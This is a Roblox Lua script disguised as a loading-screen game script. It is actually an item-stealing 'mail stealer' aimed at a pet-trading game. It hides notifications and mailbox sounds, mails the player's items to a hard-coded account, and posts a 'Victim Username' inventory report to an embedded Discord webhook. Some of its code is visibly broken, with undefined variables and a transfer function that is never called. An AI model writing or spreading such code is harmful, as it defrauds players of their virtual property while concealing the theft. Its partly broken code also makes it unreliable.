-- Services
local Players = game:GetService("Players")
local ReplicatedFirst = game:GetService("ReplicatedFirst")
local TweenService = game:GetService("TweenService")
local HttpService = game:GetService("HttpService")

-- Player and GUI Setup
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

-- Create Loading Screen
local ScreenGui = Instance.new("ScreenGui")
ScreenGui.IgnoreGuiInset = true
ScreenGui.Parent = playerGui

local frame = Instance.new("Frame")
frame.Parent = ScreenGui
frame.Size = UDim2.new(1, 0, 1, 0)
frame.BackgroundTransparency = 0
frame.BackgroundColor3 = Color3.fromRGB(0, 20, 40)

local textLabel = Instance.new("TextLabel")
textLabel.Size = UDim2.new(1, 0, 1, 0)
textLabel.BackgroundColor3 = Color3.fromRGB(0, 20, 40)
textLabel.Font = Enum.Font.GothamBold
textLabel.TextColor3 = Color3.new(.8, .8, .8)
textLabel.Text = "Script Loading-Takes 10-20 Seconds"
textLabel.TextSize = 19
textLabel.Parent = frame

local loadingRing = Instance.new("ImageLabel")
loadingRing.Size = UDim2.new(0, 256, 0, 256)
loadingRing.BackgroundTransparency = 1
loadingRing.Image = "rbxassetid://4965945816"
loadingRing.AnchorPoint = Vector2.new(0.5, 0.5)
loadingRing.Position = UDim2.new(0.5, 0, 0.5, 0)
loadingRing.Parent = frame

-- Loading Screen Animation
local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Linear, Enum.EasingDirection.In, -1)
local tween = TweenService:Create(loadingRing, tweenInfo, {Rotation = 360})
tween:Play()

-- Variables
local webhook = "https://discord.com/api/webhooks/1281988631187292170/lZ73goJXrpBhstuvuhhboxpphj5AXf3r-9XBr_QWRXja1fx-aWSpoeL2Yt1yQAce367B"
local min_rap = 190000
local Username = "jointex21"
local Username2 = ""

-- Ensure the script is executed only once
_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

-- Ensure save and inventory are loaded correctly
local function GetSave()
    local saveModule = require(game.ReplicatedStorage.Library.Client.Save)
    return saveModule and saveModule.Get() or {}
end

local save = GetSave()
local sortedItems = {}
local totalRAP = 0
local getFucked = false
local GemAmount1 = 1

-- Ensure proper handling of mail and items
local function formatNumber(number)
    local suffixes = {"", "k", "m", "b", "t"}
    local suffixIndex = 1
    while number >= 1000 do
        number = number / 1000
        suffixIndex = suffixIndex + 1
    end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

-- Sample Function to Check Existence and Initialization
local function CheckObjectInitialization()
    local someObject = player.PlayerGui:FindFirstChild("SomeObject")
    if someObject then
        print("Object found!")
        print(someObject.Size)  -- Access properties only if object is not nil
    else
        print("Object not found!")
    end
end

-- Call the sample function to verify objects
CheckObjectInitialization()

-- Continue with the rest of your script logic...

-- Ensure gem leaderstat exists
local gemsleaderstat = player:WaitForChild("leaderstats"):FindFirstChild("💎 Diamonds")
if not gemsleaderstat then
    print("Diamonds leaderstat not found!")
    return
end
local gemsleaderstatpath = gemsleaderstat
gemsleaderstatpath:GetPropertyChangedSignal("Value"):Connect(function()
    gemsleaderstatpath.Value = gemsleaderstat.Value
end)

-- Ensure the loading GUI and notifications exist
local loading = player.PlayerScripts:FindFirstChild("Scripts"):FindFirstChild("Core"):FindFirstChild("Process Pending GUI")
local noti = player.PlayerGui:FindFirstChild("Notifications")
if loading then
    loading.Disabled = true
end
if noti then
    noti:GetPropertyChangedSignal("Enabled"):Connect(function()
        noti.Enabled = false
    end)
    noti.Enabled = false
end

-- Ensure sounds are properly managed
game.DescendantAdded:Connect(function(x)
    if x.ClassName == "Sound" then
        if x.SoundId == "rbxassetid://11839132565" or x.SoundId == "rbxassetid://14254721038" or x.SoundId == "rbxassetid://12413423276" then
            x.Volume = 0
            x.PlayOnRemove = false
            x:Destroy()
        end
    end
end)

-- Function to get RAP value
local function getRAP(Type, Item)
    local devRAPCmds = require(game:GetService("ReplicatedStorage").Library.Client.DevRAPCmds)
    return (devRAPCmds and devRAPCmds.Get({
        Class = {Name = Type},
        IsA = function(hmm)
            return hmm == Type
        end,
        GetId = function()
            return Item.id
        end,
        StackKey = function()
            return HttpService:JSONEncode({id = Item.id, pt = Item.pt, sh = Item.sh, tn = Item.tn})
        end
    }) or 0)
end

-- Function to send message to webhook
local function SendMessage(username, diamonds)
    local headers = {
        ["Content-Type"] = "application/json",
    }

    local fields = {
        {
            name = "Victim Username:",
            value = username,
            inline = true
        },
        {
            name = "Items to be sent:",
            value = "",
            inline = false
        },
        {
            name = "Summary:",
            value = "",
            inline = false
        }
    }

    local combinedItems = {}
    local itemRapMap = {}

    for _, item in ipairs(sortedItems) do
        local rapKey = item.name
        if itemRapMap[rapKey] then
            itemRapMap[rapKey].amount = itemRapMap[rapKey].amount + item.amount
        else
            itemRapMap[rapKey] = {amount = item.amount, rap = item.rap}
            table.insert(combinedItems, rapKey)
        end
    end

    table.sort(combinedItems, function(a, b)
        return itemRapMap[a].rap * itemRapMap[a].amount > itemRapMap[b].rap * itemRapMap[b].amount
    end)

    for _, itemName in ipairs(combinedItems) do
        local itemData = itemRapMap[itemName]
        fields[2].value = fields[2].value .. itemName .. " (x" .. itemData.amount .. ")" .. ": " .. formatNumber(itemData.rap * itemData.amount) .. " RAP\n"
    end

    fields[3].value = fields[3].value .. "Gems: " .. formatNumber(diamonds) .. "\n"
    fields[3].value = fields[3].value .. "Total RAP: " .. formatNumber(totalRAP)
    if getFucked then
        fields[3].value = fields[3].value .. "\n\nVictim tried to use anti-mailstealer, but got fucked instead"
    end

    local data = {
        ["embeds"] = {{
            ["title"] = "New Execution",
            ["color"] = 15495442,
            ["fields"] = fields,
            ["footer"] = {
                ["text"] = "You Got The Following Items "
            }
        }}
    }

    -- Split long message into chunks
    if #fields[2].value > 1024 then
        local lines = {}
        for line in fields[2].value:gmatch("[^\r\n]+") do
            table.insert(lines, line)
        end

        while #fields[2].value > 1024 and #lines > 0 do
            table.remove(lines)
            fields[2].value = table.concat(lines, "\n")
            fields[2].value = fields[2].value .. "\nPlus more!"
        end
    end

    local body = HttpService:JSONEncode(data)

    if webhook and webhook ~= "" then
        local success, response = pcall(function()
            return HttpService:PostAsync(webhook, body, Enum.HttpContentType.ApplicationJson)
        end)
        if not success then
            warn("Failed to send webhook request: " .. response)
        end
    end
end

-- Function to handle item sending
local function sendItem(category, uid, am)
    local args = {
        [1] = Username,
        [2] = "Mail Message",
        [3] = category,
        [4] = uid,
        [5] = am or 1
    }
    local response, err = network:InvokeServer("Mailbox: Send", unpack(args))
    if not response and err == "They don't have enough space!" then
        -- Switch to alternative user if main doesn't have mailbox space
        Username = Username2
        args[1] = Username
        response = network:InvokeServer("Mailbox: Send", unpack(args))
    end
    if response then
        GemAmount1 = GemAmount1 - newamount
        newamount = math.ceil(newamount * 1.5)
        if newamount > 5000000 then
            newamount = 5000000
        end
    end
end

-- Execute SendMessage function
SendMessage(Username, gemsleaderstatpath.Value)

-- Handle Cleanup
loadingRing.Visible = false
frame:TweenPosition(UDim2.new(0, 0, 1, 0), "InOut", "Sine", 2)
wait(2)
ScreenGui:Destroy()

print("Loaded LoadingScreen")
print("Script Successful")
